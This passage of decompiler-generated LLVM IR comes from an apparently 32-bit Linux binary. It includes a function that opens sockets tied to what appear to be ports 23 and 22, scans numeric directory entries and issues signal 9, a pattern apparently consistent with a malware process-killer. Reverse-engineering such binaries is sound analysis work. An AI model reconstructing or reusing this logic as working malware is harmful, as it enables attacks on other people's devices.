  %v1_804db08 = add i32 %v0_804d7a5, 1
  store i32 %v1_804db08, i32* %edx.global-to-local, align 4
  store i32 0, i32* @ebx, align 4
  br label %dec_label_pc_804d783.outer

dec_label_pc_804db10:                             ; preds = %dec_label_pc_804d793, %dec_label_pc_804d78b
  %v1_804db10 = and i32 %v0_804db10, -256
  %v2_804db10 = or i32 %v1_804db10, 1
  br label %dec_label_pc_804d7a5

dec_label_pc_804db17:                             ; preds = %dec_label_pc_804d6fb, %dec_label_pc_804d6ec
  store i32 0, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804d711

dec_label_pc_804db27:                             ; preds = %dec_label_pc_804d80b
  store i32 0, i32* @ebx, align 4
  store i8* inttoptr (i32 6 to i8*), i8** %stack_var_-8796, align 4
  %v3_804db2e = call i32 @function_80512d0(i8 6)
  store i32 %v3_804db2e, i32* %eax.global-to-local, align 4
  store i8* inttoptr (i32 7 to i8*), i8** %stack_var_-8796, align 4
  %v3_804db3a = call i32 @function_80512d0(i8 7)
  store i32 %v3_804db3a, i32* %eax.global-to-local, align 4
  store i8* inttoptr (i32 9 to i8*), i8** %stack_var_-8796, align 4
  %v3_804db46 = call i32 @function_80512d0(i8 9)
  store i32 %v3_804db46, i32* %eax.global-to-local, align 4
  %v2_804db56.pre = load i32, i32* %stack_var_-16, align 4
  br label %dec_label_pc_804db4e

dec_label_pc_804db4e:                             ; preds = %dec_label_pc_804d694, %dec_label_pc_804db27
  %v2_804db56 = phi i32 [ %v0_804d5e3, %dec_label_pc_804d694 ], [ %v2_804db56.pre, %dec_label_pc_804db27 ]
  %v0_804db54 = load i32, i32* @ebx, align 4
  store i32 %v0_804db54, i32* %eax.global-to-local, align 4
  store i32 %v2_804db56, i32* @ebx, align 4
  store i32 %v0_804d5e2, i32* @esi, align 4
  store i32 %v0_804d5e1, i32* @edi, align 4
  store i32 %v0_804d5e0, i32* @ebp, align 4
  ret i32 %v0_804db54

dec_label_pc_804db62:                             ; preds = %dec_label_pc_804d871, %dec_label_pc_804d859
  %v2_804db65 = inttoptr i32 %v1_804d866 to i32*
  %v3_804db65 = load i32, i32* %v2_804db65, align 4
  store i32 %v3_804db65, i32* %edx.global-to-local, align 4
  %v3_804db69 = inttoptr i32 %v0_804d866 to i32*
  store i32 %v3_804db65, i32* %v3_804db69, align 4
  %v0_804db6a = call i32 @function_8052594()
  store i32 %v0_804db6a, i32* %eax.global-to-local, align 4
  %v0_804db6f = load i32, i32* @esp, align 4
  %v1_804db6f = add i32 %v0_804db6f, 20
  %v2_804db6f = inttoptr i32 %v1_804db6f to i8*
  %v3_804db6f = load i8, i8* %v2_804db6f, align 1
  %v4_804db6f = sext i8 %v3_804db6f to i32
  store i32 %v4_804db6f, i32* @ebx, align 4
  %v1_804db74 = add i32 %v0_804db6f, 16
  br label %dec_label_pc_804db77

dec_label_pc_804db77:                             ; preds = %dec_label_pc_804d82d, %dec_label_pc_804db62
  %v0_804db77 = phi i32 [ %v15_804d5e4, %dec_label_pc_804d82d ], [ %v1_804db74, %dec_label_pc_804db62 ]
  %v1_804db7a = add i32 %v0_804db77, -16
  %v2_804db7a = inttoptr i32 %v1_804db7a to i32*
  store i32 1, i32* %v2_804db7a, align 4
  %v1_804db7c = sext i8 %stack_var_-8769.2 to i32
  %v2_804db7c = call i32 @function_8053df0(i32 %v1_804db7c)
  store i32 %v2_804db7c, i32* %eax.global-to-local, align 4
  %v0_804db81 = load i32, i32* @esp, align 4
  %v1_804db81 = inttoptr i32 %v0_804db81 to i32*
  store i32 6, i32* %v1_804db81, align 4
  %v3_804db88 = call i32 @function_80512d0(i8 %stack_var_-8769.2)
  store i32 %v3_804db88, i32* %eax.global-to-local, align 4
  %v0_804db8d = load i32, i32* @esp, align 4
  %v1_804db8d = inttoptr i32 %v0_804db8d to i32*
  store i32 7, i32* %v1_804db8d, align 4
  %v3_804db94 = call i32 @function_80512d0(i8 %stack_var_-8769.2)
  store i32 %v3_804db94, i32* %eax.global-to-local, align 4
  %v0_804db99 = load i32, i32* @esp, align 4
  %v1_804db99 = inttoptr i32 %v0_804db99 to i32*
  store i32 9, i32* %v1_804db99, align 4
  %v3_804dba0 = call i32 @function_80512d0(i8 %stack_var_-8769.2)
  %v0_804dba5 = load i32, i32* @esp, align 4
  %v0_804dba8 = load i32, i32* @ebx, align 4
  store i32 %v0_804dba8, i32* %eax.global-to-local, align 4
  %v1_804dbaa = add i32 %v0_804dba5, 8780
  %v1_804dbb0 = inttoptr i32 %v1_804dbaa to i32*
  %v2_804dbb0 = load i32, i32* %v1_804dbb0, align 4
  store i32 %v2_804dbb0, i32* @ebx, align 4
  %v3_804dbb0 = add i32 %v0_804dba5, 8784
  %v1_804dbb1 = inttoptr i32 %v3_804dbb0 to i32*
  %v2_804dbb1 = load i32, i32* %v1_804dbb1, align 4
  store i32 %v2_804dbb1, i32* @esi, align 4
  %v3_804dbb1 = add i32 %v0_804dba5, 8788
  %v1_804dbb2 = inttoptr i32 %v3_804dbb1 to i32*
  %v2_804dbb2 = load i32, i32* %v1_804dbb2, align 4
  store i32 %v2_804dbb2, i32* @edi, align 4
  %v3_804dbb2 = add i32 %v0_804dba5, 8792
  %v1_804dbb3 = inttoptr i32 %v3_804dbb2 to i32*
  %v2_804dbb3 = load i32, i32* %v1_804dbb3, align 4
  store i32 %v2_804dbb3, i32* @ebp, align 4
  ret i32 %v0_804dba8

dec_label_pc_804dbb5:                             ; preds = %dec_label_pc_804d5e0
  %v3_804dbb5 = load i8, i8* %stack_var_-48, align 1
  %v4_804dbb5 = sext i8 %v3_804dbb5 to i32
  %v4_804dbcb = zext i8 %tmp47 to i32
  %v6_804dbcb = and i32 %v4_804dbb5, -256
  %v7_804dbcb = or i32 %v6_804dbcb, %v4_804dbcb
  store i32 %v7_804dbcb, i32* %eax.global-to-local, align 4
  store i8 48, i8* %stack_var_-48, align 1
  br label %dec_label_pc_804d694

dec_label_pc_804dbee:                             ; preds = %dec_label_pc_804d99d.backedge, %dec_label_pc_804d9b3, %dec_label_pc_804d99d.preheader
  %v0_804d9a6.lcssa = phi i32 [ %v0_804d9a685, %dec_label_pc_804d99d.preheader ], [ %v0_804d9a688, %dec_label_pc_804d9b3 ], [ %v0_804d9a6, %dec_label_pc_804d99d.backedge ]
  %v0_804dbf1 = load i32, i32* @ebp, align 4
  %v3_804dbf1 = inttoptr i32 %v0_804d9a6.lcssa to i32*
  store i32 %v0_804dbf1, i32* %v3_804dbf1, align 4
  %v0_804dbf2 = call i32 @function_8052594()
  store i32 %v0_804dbf2, i32* %eax.global-to-local, align 4
  %v0_804dbf7 = load i32, i32* @esp, align 4
  %v1_804dbf7 = add i32 %v0_804dbf7, 16
  br label %dec_label_pc_804d859

; uselistorder directives
  uselistorder i32 %v1_804db08, { 1, 0 }
  uselistorder i32 %v1_804daf8, { 2, 0, 1 }
  uselistorder i32 %v0_804d9a1, { 1, 0, 2 }
  uselistorder i32 %v0_804daca, { 0, 4, 1, 2, 3 }
  uselistorder i32 %v0_804da9d, { 0, 2, 1 }
  uselistorder i32 %v0_804d9a688, { 0, 1, 6, 5, 4, 3, 2 }
  uselistorder i32 %v1_804d98b, { 0, 2, 1, 3 }
  uselistorder i32 %v0_804d90e, { 3, 0, 1, 2, 4 }
  uselistorder i32 %v1_804d883, { 0, 2, 1 }
  uselistorder i32 %v1_804d866, { 1, 0 }
  uselistorder i32 %v0_804d866, { 0, 5, 1, 2, 3, 4, 6 }
  uselistorder i32 %v0_804d861, { 1, 2, 0, 3 }
  uselistorder i32 %v0_804d859, { 1, 0 }
  uselistorder i32 %v4_804d833, { 1, 0, 2 }
  uselistorder i8 %stack_var_-8769.2, { 0, 2, 1, 3 }
  uselistorder i8* %.pre-phi, { 1, 0 }
  uselistorder i32 %v1_804d7ef, { 1, 0 }
  uselistorder i32 %v3_804d7e7, { 1, 3, 2, 4, 0 }
  uselistorder i8 %v3_804d7ca, { 0, 2, 1 }
  uselistorder i32 %v1_804d7ca, { 0, 2, 1 }
  uselistorder i32 %v1_804d7a5, { 1, 0 }
  uselistorder i32 %storemerge4, { 0, 2, 1 }
  uselistorder i32 %v1_804d786, { 2, 3, 4, 0, 1, 5, 6, 7 }
  uselistorder i32 %v7_804d783, { 0, 3, 1, 2 }
  uselistorder i32 %v0_804db10, { 1, 0, 2 }
  uselistorder i32 %v0_804daf8, { 3, 2, 0, 1 }
  uselistorder i8 %stack_var_-8769.1.ph, { 3, 0, 1, 2 }
  uselistorder i32 %v1_804d735, { 0, 2, 1 }
  uselistorder i32 %v7_804d732, { 1, 0 }
  uselistorder i32 %v0_804d72f, { 1, 0 }
  uselistorder i32 %v4_804d6dc, { 1, 2, 0 }
  uselistorder i32 %v7_804d718, { 1, 0, 2 }
  uselistorder i32 %v1_804d72f, { 2, 0, 1, 3 }
  uselistorder i32 %v8_804d706, { 1, 0, 3, 2 }
  uselistorder i32 %v1_804d705, { 0, 1, 3, 2 }
  uselistorder i32 %v2_804d744, { 1, 0, 2 }
  uselistorder i32 %v2_804d66a, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v2_804d5ea, { 1, 2, 0, 3 }
  uselistorder i32 %v15_804d5e4, { 3, 0, 1, 2 }
  uselistorder i8* %stack_var_-561, { 1, 2, 6, 0, 3, 4, 5 }
  uselistorder i8** %stack_var_-8796, { 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 1, 14, 13, 12, 0, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2 }
  uselistorder i8* %stack_var_-48, { 4, 3, 0, 1, 2 }
  uselistorder i32* %stack_var_-32, { 0, 1, 2, 4, 3 }
  uselistorder i32* %edx.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 29, 30, 28, 31, 32, 33, 34, 35, 36, 37 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 91, 77, 78, 79, 80, 81, 82, 92, 83, 84, 85, 86, 87, 88, 89, 90 }
  uselistorder i32 (i8*, i32)* @function_8051da0, { 1, 0, 2, 3, 4 }
  uselistorder i32 ptrtoint (i32* @global_var_8054b2d.6 to i32), { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @function_8051ec0, { 1, 2, 0 }
  uselistorder label %dec_label_pc_804db77, { 1, 0 }
  uselistorder label %dec_label_pc_804db4e, { 1, 0 }
  uselistorder label %dec_label_pc_804d99d.backedge, { 0, 2, 1 }
  uselistorder label %dec_label_pc_804d9b3, { 1, 0 }
  uselistorder label %dec_label_pc_804d859, { 3, 0, 1, 2, 4 }
  uselistorder label %dec_label_pc_804d80b.loopexit, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804d6ec.lr.ph, { 1, 0 }
  uselistorder label %dec_label_pc_804d6d4.outer.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_804d783, { 1, 0 }
  uselistorder label %dec_label_pc_804d744, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804d6d4.backedge, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804d711, { 1, 0 }
  uselistorder label %dec_label_pc_804d705, { 1, 0 }
  uselistorder label %dec_label_pc_804d694, { 1, 0 }
}

define i32 @function_804dc00() local_unnamed_addr {
dec_label_pc_804dc00:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-68 = alloca i32, align 4
  %stack_var_-8388 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-8444 = alloca i32, align 4
  %stack_var_-8460 = alloca i32, align 4
  store i32 0, i32* %stack_var_-8460, align 4
  %v2_804dc0c = call i32 @function_8052502(i32* null)
  store i32 %v2_804dc0c, i32* %eax.global-to-local, align 4
  store i32 %v2_804dc0c, i32* @edi, align 4
  %v0_804dc13 = call i32 @function_805226f()
  store i32 %v0_804dc13, i32* %eax.global-to-local, align 4
  %v12_804dc18 = ptrtoint i32* %stack_var_-8444 to i32
  store i32 %v0_804dc13, i32* @global_var_80569c4.21, align 4
  %tmp113 = icmp slt i32 %v0_804dc13, 1
  br i1 %tmp113, label %dec_label_pc_804dc2f, label %dec_label_pc_804dc24

dec_label_pc_804dc24:                             ; preds = %dec_label_pc_804de10, %dec_label_pc_804dce1, %dec_label_pc_804dc2f, %dec_label_pc_804dc00
  %v0_804dc2e = phi i32 [ -1, %dec_label_pc_804dce1 ], [ 0, %dec_label_pc_804dc2f ], [ %v0_804dc13, %dec_label_pc_804dc00 ], [ 0, %dec_label_pc_804de10 ]
  ret i32 %v0_804dc2e

dec_label_pc_804dc2f:                             ; preds = %dec_label_pc_804dc00
  %v1_804dc2f = add i32 %v0_804dc13, 1
  %v8_804dc2f = icmp eq i32 %v1_804dc2f, 0
  store i32 %v1_804dc2f, i32* %eax.global-to-local, align 4
  br i1 %v8_804dc2f, label %dec_label_pc_804dc24, label %dec_label_pc_804dc32

dec_label_pc_804dc32:                             ; preds = %dec_label_pc_804dc2f
  store i32 2, i32* %stack_var_-52, align 4
  store i32 5888, i32* %stack_var_-8460, align 4
  %v1_804dc4f = call i32 @function_804d5e0(i32 5888)
  store i32 %v1_804dc4f, i32* %eax.global-to-local, align 4
  store i32 2, i32* %stack_var_-8460, align 4
  %v3_804dc67 = call i32 @function_8052a35(i32 2, i32 1, i32 0)
  store i32 %v3_804dc67, i32* %eax.global-to-local, align 4
  store i32 %v3_804dc67, i32* @ebx, align 4
  %v10_804dc71 = icmp eq i32 %v3_804dc67, -1
  br i1 %v10_804dc71, label %dec_label_pc_804dc94, label %dec_label_pc_804dc76

dec_label_pc_804dc76:                             ; preds = %dec_label_pc_804dc32
  %v2_804dc76 = ptrtoint i32* %stack_var_-52 to i32
  store i32 %v2_804dc76, i32* %eax.global-to-local, align 4
  %v0_804dc7d = load i32, i32* @edx, align 4
  store i32 %v3_804dc67, i32* %stack_var_-8460, align 4
  %v4_804dc82 = call i32 @function_805282f(i32 %v3_804dc67, i32 %v2_804dc76, i32 16, i32 %v0_804dc7d)
  store i32 %v4_804dc82, i32* %eax.global-to-local, align 4
  %v2_804dc87 = load i32, i32* %stack_var_-8460, align 4
  store i32 %v2_804dc87, i32* @esi, align 4
  store i32 %v2_804dc76, i32* @ebp, align 4
  %v0_804dc8b = load i32, i32* @ebx, align 4
  store i32 %v0_804dc8b, i32* %stack_var_-8460, align 4
  %v2_804dc8c = call i32 @function_80528eb(i32 %v0_804dc8b, i32 1)
  store i32 %v2_804dc8c, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804dc94

dec_label_pc_804dc94:                             ; preds = %dec_label_pc_804dc32, %dec_label_pc_804dc76
  store i32 5632, i32* %stack_var_-8460, align 4
  %v1_804dc9c = call i32 @function_804d5e0(i32 5632)
  store i32 %v1_804dc9c, i32* %eax.global-to-local, align 4
  store i32 2, i32* %stack_var_-8460, align 4
  %v3_804dcb4 = call i32 @function_8052a35(i32 2, i32 1, i32 0)
  store i32 %v3_804dcb4, i32* %eax.global-to-local, align 4
  store i32 %v3_804dcb4, i32* @ebx, align 4
  %v10_804dcbe = icmp eq i32 %v3_804dcb4, -1
  br i1 %v10_804dcbe, label %dec_label_pc_804dce1, label %dec_label_pc_804dcc3

dec_label_pc_804dcc3:                             ; preds = %dec_label_pc_804dc94
  %v2_804dcc3 = ptrtoint i32* %stack_var_-52 to i32
  store i32 %v2_804dcc3, i32* %eax.global-to-local, align 4
  %v0_804dcca = load i32, i32* @ecx, align 4
  store i32 %v3_804dcb4, i32* %stack_var_-8460, align 4
  %v4_804dccf = call i32 @function_805282f(i32 %v3_804dcb4, i32 %v2_804dcc3, i32 16, i32 %v0_804dcca)
  %v2_804dcd4 = load i32, i32* %stack_var_-8460, align 4
  store i32 %v2_804dcd4, i32* %eax.global-to-local, align 4
  %v0_804dcd8 = load i32, i32* @ebx, align 4
  store i32 %v0_804dcd8, i32* %stack_var_-8460, align 4
  %v2_804dcd9 = call i32 @function_80528eb(i32 %v0_804dcd8, i32 1)
  store i32 %v2_804dcd9, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804dce1

dec_label_pc_804dce1:                             ; preds = %dec_label_pc_804dc94, %dec_label_pc_804dcc3
  store i32 5, i32* %stack_var_-8460, align 4
  %v1_804dce6 = call i32 @function_8053df0(i32 5)
  store i32 %v1_804dce6, i32* %eax.global-to-local, align 4
  store i32 4096, i32* %stack_var_-8460, align 4
  %v1_804dcf2 = call i32 @function_8052bd4(i32 4096)
  %v2_804dcf2 = inttoptr i32 %v1_804dcf2 to i8*
  store i32 %v1_804dcf2, i32* %eax.global-to-local, align 4
  store i32 %v1_804dcf2, i32* @global_var_80569c0.22, align 64
  store i8 0, i8* %v2_804dcf2, align 1
  store i32 6, i32* %stack_var_-8460, align 4
  store i32 0, i32* @global_var_8056940.23, align 64
  %v2_804dd10 = call i32 @function_8051350(i8 6)
  store i32 %v2_804dd10, i32* %eax.global-to-local, align 4
  store i32 7, i32* %stack_var_-8460, align 4
  %v2_804dd1c = call i32 @function_8051350(i8 7)
  store i32 1, i32* %eax.global-to-local, align 4
  store i32 6, i32* %stack_var_-8460, align 4
  %v3_804dd27 = call i32 @function_80512a0(i32 6, i32* null)
  %v2_804dd2c = load i32, i32* %stack_var_-8460, align 4
  store i32 %v2_804dd2c, i32* @ebx, align 4
  %v2_804dd2f = ptrtoint i32* %stack_var_-8388 to i32
  store i32 %v2_804dd2f, i32* %eax.global-to-local, align 4
  store i32 %v2_804dd2f, i32* %stack_var_-8460, align 4
  %v2_804dd38 = bitcast i32* %stack_var_-8388 to i8*
  %v3_804dd38 = call i32 @function_8051cc0(i8* %v2_804dd38, i32 %v3_804dd27)
  store i32 %v3_804dd38, i32* %eax.global-to-local, align 4
  %v2_804dd41 = add i32 %v3_804dd38, %v2_804dd2f
  store i32 %v2_804dd41, i32* @ebx, align 4
  %v0_804dd43 = call i32 @function_8052295()
  store i32 %v0_804dd43, i32* %eax.global-to-local, align 4
  %v2_804dd4b = ptrtoint i32* %stack_var_-68 to i32
  store i32 %v0_804dd43, i32* %stack_var_-8460, align 4
  %v3_804dd56 = sext i32 %v0_804dd43 to i64
  %v4_804dd56 = call i32 @function_80520b0(i64 %v3_804dd56, i32 10, i32 %v2_804dd4b)
  store i32 %v4_804dd56, i32* %eax.global-to-local, align 4
  %v0_804dd5e = load i32, i32* @ebx, align 4
  store i32 %v0_804dd5e, i32* %stack_var_-8460, align 4
  %v2_804dd5f = inttoptr i32 %v0_804dd5e to i8*
  %v3_804dd5f = call i32 @function_8051cc0(i8* %v2_804dd5f, i32 %v4_804dd56)
  %v2_804dd64 = load i32, i32* %stack_var_-8460, align 4
  store i32 %v2_804dd64, i32* @ebp, align 4
  %v0_804dd65 = load i32, i32* @ebx, align 4
  %v2_804dd65 = add i32 %v0_804dd65, %v3_804dd5f
  store i32 %v2_804dd65, i32* @ebx, align 4
  store i32 %v4_804dd56, i32* %eax.global-to-local, align 4
  store i32 7, i32* %stack_var_-8460, align 4
  %v3_804dd6c = call i32 @function_80512a0(i32 7, i32* null)
  store i32 %v3_804dd6c, i32* %eax.global-to-local, align 4
  %v0_804dd74 = load i32, i32* @ebx, align 4
  store i32 %v0_804dd74, i32* %stack_var_-8460, align 4
  %v2_804dd75 = inttoptr i32 %v0_804dd74 to i8*
  %v3_804dd75 = call i32 @function_8051cc0(i8* %v2_804dd75, i32 %v3_804dd6c)
  store i32 %v3_804dd75, i32* @esi, align 4
  store i32 %v2_804dd2f, i32* %eax.global-to-local, align 4
  store i32 %v2_804dd2f, i32* %stack_var_-8460, align 4
  %v3_804dd85 = call i32 @function_8052352(i8* %v2_804dd38, i32 0)
  store i32 %v3_804dd85, i32* %eax.global-to-local, align 4
  %v10_804dd8d = icmp eq i32 %v3_804dd85, -1
  br i1 %v10_804dd8d, label %dec_label_pc_804dc24, label %dec_label_pc_804dd96

dec_label_pc_804dd96:                             ; preds = %dec_label_pc_804dce1
  store i32 %v3_804dd85, i32* %stack_var_-8460, align 4
  %v1_804dd9a = call i32 @function_8052241(i32 %v3_804dd85)
  store i32 %v1_804dd9a, i32* %eax.global-to-local, align 4
  store i32 6, i32* %stack_var_-8460, align 4
  %v2_804dda6 = call i32 @function_80512d0(i8 6)
  store i32 %v2_804dda6, i32* %eax.global-to-local, align 4
  store i32 7, i32* %stack_var_-8460, align 4
  %v2_804ddb2 = call i32 @function_80512d0(i8 7)
  %v0_804ddba = load i32, i32* @global_var_80569c0.22, align 64
  store i32 %v2_804dd2f, i32* %eax.global-to-local, align 4
  store i32 %v2_804dd2f, i32* %stack_var_-8460, align 4
  %v4_804ddca = call i32 @function_8052412(i8* %v2_804dd38, i32 %v0_804ddba, i32 4095)
  store i32 %v4_804ddca, i32* %eax.global-to-local, align 4
  %v10_804ddd4 = icmp eq i32 %v4_804ddca, -1
  br i1 %v10_804ddd4, label %dec_label_pc_804dde2, label %dec_label_pc_804ddd9

dec_label_pc_804ddd9:                             ; preds = %dec_label_pc_804dd96
  %v0_804ddd9 = load i32, i32* @global_var_80569c0.22, align 64
  store i32 %v0_804ddd9, i32* %eax.global-to-local, align 4
  %v2_804ddde = add i32 %v0_804ddd9, %v4_804ddca
  %v3_804ddde = inttoptr i32 %v2_804ddde to i8*
  store i8 0, i8* %v3_804ddde, align 1
  br label %dec_label_pc_804dde2

dec_label_pc_804dde2:                             ; preds = %dec_label_pc_804dd96, %dec_label_pc_804ddd9
  %v0_804dde8 = load i32, i32* @ebx, align 4
  %v1_804dde8 = load i32, i32* @esi, align 4
  %v2_804dde8 = sub i32 %v0_804dde8, %v2_804dd2f
  %v2_804ddeb = add i32 %v2_804dde8, %v1_804dde8
  %v0_804dded = load i32, i32* @edi, align 4
  store i32 %v0_804dded, i32* @ebx, align 4
  store i32 400, i32* @esi, align 4
  store i32 %v2_804dd2f, i32* @eax, align 4
  store i32 %v2_804dd2f, i32* %stack_var_-8460, align 4
  %v2_804ddfa = call i32 @function_8051d30(i32 %v2_804dd2f, i32 %v2_804ddeb)
  store i32 %v2_804ddfa, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804de10

dec_label_pc_804de10:                             ; preds = %dec_label_pc_804e043, %dec_label_pc_804dde2
  %storemerge8 = phi i32 [ %v1_804e050, %dec_label_pc_804e043 ], [ %v12_804dc18, %dec_label_pc_804dde2 ]
  %v1_804de13 = add i32 %storemerge8, -16
  %v2_804de13 = inttoptr i32 %v1_804de13 to i32*
  store i32 6, i32* %v2_804de13, align 4
  %v2_804de15 = call i32 @function_8051350(i8 0)
  store i32 %v2_804de15, i32* %eax.global-to-local, align 4
  %v0_804de1a = load i32, i32* @esp, align 4
  %v1_804de1a = inttoptr i32 %v0_804de1a to i32*
  %v2_804de1a = load i32, i32* %v1_804de1a, align 4
  store i32 %v2_804de1a, i32* %eax.global-to-local, align 4
  %v3_804de1a = add i32 %v0_804de1a, 4
  %v1_804de1b = inttoptr i32 %v3_804de1a to i32*
  store i32 0, i32* %v1_804de1b, align 4
  store i32 6, i32* %v1_804de1a, align 4
  %v3_804de20 = call i32 @function_80512a0(i32 0, i32* nonnull @0)
  store i32 %v3_804de20, i32* %eax.global-to-local, align 4
  %v1_804de25 = load i32, i32* @esp, align 4
  %v2_804de25 = inttoptr i32 %v1_804de25 to i32*
  store i32 %v3_804de20, i32* %v2_804de25, align 4
  %v1_804de28 = call i32 @function_8052604(i32 0)
  store i32 %v1_804de28, i32* %eax.global-to-local, align 4
  %v1_804de2d = load i32, i32* @esp, align 4
  %v2_804de2d = add i32 %v1_804de2d, 32
  %v3_804de2d = inttoptr i32 %v2_804de2d to i32*
  store i32 %v1_804de28, i32* %v3_804de2d, align 4
  %v0_804de34 = load i32, i32* %eax.global-to-local, align 4
  %v1_804de34 = icmp eq i32 %v0_804de34, 0
  br i1 %v1_804de34, label %dec_label_pc_804dc24, label %dec_label_pc_804de3c

dec_label_pc_804de3c:                             ; preds = %dec_label_pc_804de10
  %v0_804de31 = load i32, i32* @esp, align 4
  %v2_804de3f = inttoptr i32 %v0_804de31 to i32*
  store i32 6, i32* %v2_804de3f, align 4
  %v2_804de41 = call i32 @function_80512d0(i8 0)
  store i32 %v2_804de41, i32* %eax.global-to-local, align 4
  %v0_804de46 = load i32, i32* @esp, align 4
  %v1_804de46 = add i32 %v0_804de46, 16
  br label %dec_label_pc_804de50

dec_label_pc_804de50:                             ; preds = %dec_label_pc_804e058, %dec_label_pc_804e064, %dec_label_pc_804de6a, %dec_label_pc_804e081, %dec_label_pc_804e038, %dec_label_pc_804deac, %dec_label_pc_804e31c, %dec_label_pc_804de3c
  %v0_804de50 = phi i32 [ %v1_804de46, %dec_label_pc_804de3c ], [ %v1_804e350, %dec_label_pc_804e31c ], [ %v1_804de9e, %dec_label_pc_804deac ], [ %v0_804e03a, %dec_label_pc_804e038 ], [ %v1_804e08b, %dec_label_pc_804e081 ], [ %v1_804de5d, %dec_label_pc_804de6a ], [ %v1_804de9e, %dec_label_pc_804e064 ], [ %v1_804de9e, %dec_label_pc_804e058 ]
  %v1_804de53 = add i32 %v0_804de50, 16
  %v2_804de53 = inttoptr i32 %v1_804de53 to i32*
  %v3_804de53 = load i32, i32* %v2_804de53, align 4
  store i32 %v3_804de53, i32* %eax.global-to-local, align 4
  %v2_804de57 = add i32 %v0_804de50, -16
  %v3_804de57 = inttoptr i32 %v2_804de57 to i32*
  store i32 %v3_804de53, i32* %v3_804de57, align 4
  %v0_804de58 = call i32 @function_80526f5()
  store i32 %v0_804de58, i32* %eax.global-to-local, align 4
  %v0_804de5d = load i32, i32* @esp, align 4
  store i32 %v0_804de58, i32* @edx, align 4
  %v1_804de62 = icmp eq i32 %v0_804de58, 0
  br i1 %v1_804de62, label %dec_label_pc_804e043, label %dec_label_pc_804de6a

dec_label_pc_804de6a:                             ; preds = %dec_label_pc_804de50
  %v1_804de5d = add i32 %v0_804de5d, 16
  %v1_804de6a = add i32 %v0_804de58, 11
  %v2_804de6a = inttoptr i32 %v1_804de6a to i8*
  %v3_804de6a = load i8, i8* %v2_804de6a, align 1
  %v4_804de6a = zext i8 %v3_804de6a to i32
  %v6_804de6a = and i32 %v0_804de58, -256
  %v7_804de6a = or i32 %v4_804de6a, %v6_804de6a
  %v1_804de6d = add i32 %v7_804de6a, -48
  %v8_804de6d = trunc i32 %v1_804de6d to i8
  store i32 %v1_804de6d, i32* %eax.global-to-local, align 4
  %v8_804de72 = icmp ugt i8 %v8_804de6d, 9
  br i1 %v8_804de72, label %dec_label_pc_804de50, label %dec_label_pc_804de74

dec_label_pc_804de74:                             ; preds = %dec_label_pc_804de6a
  store i32 %v1_804de6a, i32* @edi, align 4
  %v3_804de7a = inttoptr i32 %v0_804de5d to i32*
  store i32 %v1_804de6a, i32* %v3_804de7a, align 4
  %v0_804de7b = call i32 @function_8053c46()
  store i32 %v0_804de7b, i32* %eax.global-to-local, align 4
  %v0_804de80 = load i32, i32* @esp, align 4
  store i32 %v0_804de7b, i32* @ebp, align 4
  %v1_804de85 = add i32 %v0_804de80, 28
  %v2_804de85 = inttoptr i32 %v1_804de85 to i32*
  %v3_804de85 = load i32, i32* %v2_804de85, align 4
  %v1_804de89 = add i32 %v3_804de85, 1
  store i32 %v1_804de89, i32* %eax.global-to-local, align 4
  %v0_804de8a = load i32, i32* @esi, align 4
  store i32 %v1_804de89, i32* %v2_804de85, align 4
  %v5_804de90 = icmp slt i32 %v0_804de8a, %v0_804de7b
  %v0_804deb3 = load i32, i32* @esp, align 4
  %v1_804deb6 = add i32 %v0_804deb3, -16
  %v2_804deb6 = inttoptr i32 %v1_804deb6 to i32*
  store i32 0, i32* %v2_804deb6, align 4
  %v2_804deb8 = call i32 @function_8052502(i32* null)
  store i32 %v2_804deb8, i32* %eax.global-to-local, align 4
  br i1 %v5_804de90, label %dec_label_pc_804deb3, label %dec_label_pc_804de92

dec_label_pc_804de92:                             ; preds = %dec_label_pc_804de74
  %v1_804de9c = load i32, i32* @ebx, align 4
  %v2_804de9c = sub i32 %v2_804deb8, %v1_804de9c
  store i32 %v2_804de9c, i32* %eax.global-to-local, align 4
  %v0_804de9e = load i32, i32* @esp, align 4
  %v1_804de9e = add i32 %v0_804de9e, 16
  %v1_804dea1 = add i32 %v2_804de9c, -600
  %v6_804dea1 = sub i32 599, %v2_804de9c
  %v7_804dea1 = and i32 %v6_804dea1, %v2_804de9c
  %v8_804dea1 = icmp slt i32 %v7_804dea1, 0
  %v9_804dea1 = icmp eq i32 %v1_804dea1, 0
  %v10_804dea1 = icmp slt i32 %v1_804dea1, 0
  %v3_804dea6 = icmp ne i1 %v10_804dea1, %v8_804dea1
  %v4_804dea6 = or i1 %v9_804dea1, %v3_804dea6
  br i1 %v4_804dea6, label %dec_label_pc_804e058, label %dec_label_pc_804deac

dec_label_pc_804deac:                             ; preds = %dec_label_pc_804de92
  store i32 400, i32* @esi, align 4
  br label %dec_label_pc_804de50

dec_label_pc_804deb3:                             ; preds = %dec_label_pc_804de74
  store i32 %v2_804deb8, i32* %eax.global-to-local, align 4
  %v0_804debd = load i32, i32* @esp, align 4
  %v1_804debd = inttoptr i32 %v0_804debd to i32*
  store i32 6, i32* %v1_804debd, align 4
  %v1_804dec4 = load i32, i32* @esp, align 4
  %v2_804dec4 = add i32 %v1_804dec4, 24
